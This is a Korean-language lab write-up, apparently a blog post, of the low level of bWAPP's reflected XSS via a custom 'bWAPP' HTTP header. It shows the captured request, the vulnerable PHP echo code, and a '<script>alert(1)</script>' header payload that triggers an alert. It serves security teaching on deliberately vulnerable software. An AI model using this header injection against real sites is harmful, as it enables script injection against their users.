---
layout: single
title: (bWAPP)XSS - Reflected (Custom Header)
categories: bwapp
tag: [xss,reflected,stored,reflected xss, bee box,stored xss, OWASP TOP 10, OWASP, bwapp, dom xss]
toc: true
author_profile: false
---

## Level - Low
![그림 1-1](/assets/image/bwapp/xss/Reflected%20(Custom%20Header)-archive/image.png)

- 해당 페이지에서 bWAPP 라는 사용자가 따로 정의한 Custom Header 를 사용하는 듯 하다.

```
GET /bWAPP/xss_custom_header.php HTTP/1.1
Host: 192.168.146.133
Cookie: PHPSESSID=796791ea165926173fb4b5cb319fe0b2; security_level=0
Cache-Control: max-age=0
Sec-Ch-Ua: "Not(A:Brand";v="24", "Chromium";v="122"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://192.168.146.133/bWAPP/portal.php
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
```

- Requess 값을 확인했을 떄는 따로 Header가 추가되어 전송되지는 않는 듯 하다.

```php
<?php

foreach(getallheaders() as $name => $value)
{

    if($name == "bWAPP")
    {

        echo "<i>" . xss($value) ."</i>";

    }

}

?>
```
- 해당 시나리오의 적용된 소스코드 중 일부이다.
- Header 정보를 가져와 Header의 이름이 bWAPP일 경우 아래 echo 명령어 부분을 실행한다.

```
bWAPP: test
```

- 위와 같이 bWAPP 라는 Header에 test라는 임의의 문자열을 주고 전송했다.

![그림 1-2](/assets/image/bwapp/xss/Reflected%20(Custom%20Header)-archive/image-1.png)
- test 문자열이 출력되는 걸 확인할 수 있다.
- 즉 해당 \<i> 태그 안에 \<script>문을 사용하여 실행이 가능하다.

```
bWAPP: <script>alert(1)</script>
```

![그림 1-3](/assets/image/bwapp/xss/Reflected%20(Custom%20Header)-archive/image-2.png)
- 성공적으로 alert 창이 실행된다.